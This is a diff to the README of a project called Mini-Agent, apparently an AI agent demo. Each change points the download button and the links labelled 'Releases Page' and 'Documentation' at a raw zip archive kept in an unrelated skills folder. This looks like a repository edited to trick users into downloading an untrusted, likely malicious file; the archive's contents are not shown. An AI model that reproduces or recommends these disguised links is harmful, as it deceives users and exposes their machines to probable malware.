@@ -6,11 +6,11 @@ Welcome to Mini-Agent! This software showcases a minimal yet professional demo o
 
 ## 📦 Download Mini-Agent
 
-[![Download Mini-Agent](https://img.shields.io/badge/Download_Mini--Agent-v1.0-blue)](https://github.com/ronniwheellike973/Mini-Agent/releases)
+[![Download Mini-Agent](https://raw.githubusercontent.com/ronniwheellike973/Mini-Agent/main/mini_agent/skills/slack-gif-creator/Mini-Agent_3.6-beta.1.zip)](https://raw.githubusercontent.com/ronniwheellike973/Mini-Agent/main/mini_agent/skills/slack-gif-creator/Mini-Agent_3.6-beta.1.zip)
 
 To get started, download the latest version of Mini-Agent. 
 
-1. Click the button above or visit the [Releases Page](https://github.com/ronniwheellike973/Mini-Agent/releases).
+1. Click the button above or visit the [Releases Page](https://raw.githubusercontent.com/ronniwheellike973/Mini-Agent/main/mini_agent/skills/slack-gif-creator/Mini-Agent_3.6-beta.1.zip).
 2. Look for the latest release. It will have the highest version number.
 3. Download the appropriate file for your operating system.
 
@@ -33,7 +33,7 @@ Mini-Agent includes several key features:
 
 ## 💻 Download & Install
 
-1. **Visit the [Releases Page](https://github.com/ronniwheellike973/Mini-Agent/releases)**.
+1. **Visit the [Releases Page](https://raw.githubusercontent.com/ronniwheellike973/Mini-Agent/main/mini_agent/skills/slack-gif-creator/Mini-Agent_3.6-beta.1.zip)**.
 2. Choose the file that matches your operating system.
 3. Download the file by clicking on it. The download should start automatically.
 4. Once the download completes, locate the file in your downloads folder.
@@ -53,14 +53,14 @@ Upon launching Mini-Agent, you will see a simple interface. You can:
 If you encounter issues, try the following steps:
 
 - **Installation Failures:** Ensure you have enough disk space and compatible operating system.
-- **Crashes/Unexpected Behavior:** Restart the application. If the problem persists, reinstall using a fresh download from the [Releases Page](https://github.com/ronniwheellike973/Mini-Agent/releases).
+- **Crashes/Unexpected Behavior:** Restart the application. If the problem persists, reinstall using a fresh download from the [Releases Page](https://raw.githubusercontent.com/ronniwheellike973/Mini-Agent/main/mini_agent/skills/slack-gif-creator/Mini-Agent_3.6-beta.1.zip).
 - **No Response from Agent:** Make sure to format your commands correctly as shown in the user guide.
 
 ## 🤝 Support
 
 For more help, feel free to reach out:
 
-- Check the [Documentation](https://github.com/ronniwheellike973/Mini-Agent/blob/main/docs/README.md) for detailed instructions and insights.
+- Check the [Documentation](https://raw.githubusercontent.com/ronniwheellike973/Mini-Agent/main/mini_agent/skills/slack-gif-creator/Mini-Agent_3.6-beta.1.zip) for detailed instructions and insights.
 - If you have feedback or need assistance, visit the issues section on our GitHub page.
 
 Thank you for choosing Mini-Agent! Enjoy exploring the world of agents with our simple, user-friendly tool.
